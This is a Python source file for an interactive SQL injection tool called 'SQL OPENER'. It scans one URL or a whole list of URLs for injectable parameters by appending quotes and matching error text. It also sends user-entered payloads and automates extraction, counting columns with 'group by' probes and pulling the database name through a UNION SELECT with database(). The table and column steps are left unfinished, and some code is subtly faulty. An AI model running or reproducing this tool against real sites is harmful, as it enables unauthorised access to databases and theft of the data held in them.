import requests as r
from colorama import Fore as F
import os.path

print(r'''
  ____   ___  _        ___  ____  _____ _   _ _____ ____  
 / ___| / _ \| |      / _ \|  _ \| ____| \ | | ____|  _ \ 
 \___ \| | | | |     | | | | |_) |  _| |  \| |  _| | |_) |
  ___) | |_| | |___  | |_| |  __/| |___| |\  | |___|  _ < 
 |____/ \__\_\_____|  \___/|_|   |_____|_| \_|_____|_| \_\ ''' + '\n')

menu1 = ['1. SQL Check', '2. Enter Payload', '3. Auto Extract', '0. Exit']
menu2 = ['1. One host', '2. Mass check']
menu3 = ['1. Count Columns', '2. Database name', '3. Tables', '4. Columns', '0. Exit']

print('\n'.join(menu1))


def action_1_1():
    global host
    host = input('Enter host: ')
    while r.get(host).status_code not in range(200, 300):
        print('\nEnter the correct host!!!')
        host = input('Enter host: ')
    else:
        if 'Warning' in r.get(f'{host}"').text or 'Error While Selection process' in r.get(f'{host}"').text \
                or 'Error While Selection process' in r.get(f"{host}'").text or 'Warning' in r.get(f"{host}'").text:
            return f'\n{host} ===> ' + F.GREEN + 'Vulnerable!' + F.RESET
        else:
            return f'\n{host} ===> ' + F.RED + 'Not Vulnerable!' + F.RESET


def action_1_2():
    while not os.path.exists(file := input('Enter the path to the file with the URL-s: ')):
        print('\nEnter the correct path to file!!!')
    else:
        with open(file, 'r') as f:
            for link in f.readlines():
                link.replace('\n', '')
                if 'Warning' in r.get(link).text or 'Error While Selection process' in r.get(link).text:
                    print(f'{link} ===> ' + F.GREEN + 'Vulnerable!' + F.RESET)
                else:
                    print(f'{link} ===> ' + F.RED + 'Not Vulnerable!' + F.RESET)


def col_num():
    for column in range(1, 1000000, 1):
        if 'Warning' not in r.get(
                f"{host}' group by {column} -- -").text and 'Error While Selection process' not in r.get(
                f"{host}' group by {column} -- -").text:
            continue
        else:
            return column


def action_3():
    if 'Not Vulnerable' in action_1_1():
        print(F.RED + f'\nThe host is NOT Vulnerable!' + F.RESET)
    else:
        print('\n' + '\n'.join(menu3))
        while (action3 := int(input('\nSelect option: '))) not in range(5):
            print('\nChoose a correct option!!!')
        else:
            if action3 == 0:
                print('\n\tBye-bye!\n')
                raise SystemExit
            elif action3 == 1:
                print(F.BLUE + f'\nThe table has {col_num() - 1} columns.' + F.RESET)
            elif action3 == 2:
                top = col_num()
                col = [str(j) for j in range(1, top)]
                vulnerable_column = r.get(f"{host[:-1]}9999999' union select {','.join(col)} -- -").text.split('Username is : ')[1].split('<br></center>')[0]
                col[col.index(vulnerable_column)] = 'database()'
                db_name = r.get(f"{host[:-1]}9999999' union select {','.join(col)} -- -").text.split('Username is : ')[1].split('<br></center>')[0]
                print(F.RED + f'The database name is {db_name}.' + F.RESET)
            #elif action3 == 4:






def action_2():
    while r.get(host := input('Enter host: ')).status_code not in range(200, 300):
        print('\nEnter the correct host!!!')
    else:
        while (payload := input('\nEnter payload: ')) != '0':
            print(F.RED +
                  r.get(host + payload).text.split('''<font color="white" size="4">\r\n<center><br>''')[1].split(
                      '<br></center>')[0] + F.RESET)
        else:
            print('\n\tBye-bye!\n')
            raise SystemExit


if __name__ == '__main__':
    while (action1 := int(input('\nSelect option: '))) not in range(4):
        print('\nChoose a correct option!!!')
    else:
        if action1 == 1:
            print('\n'.join(menu2))
            while (action2 := int(input('\nSelect option: '))) not in [1, 2]:
                print('\nChoose a correct option!!!')
            else:
                if action2 == 1:
                    print(action_1_1())
                else:
                    action_1_2()
        elif action1 == 2:
            action_2()
        elif action1 == 3:
            action_3()
        elif action1 == 0:
            print('\n\tBye-bye!\n')
            raise SystemExit
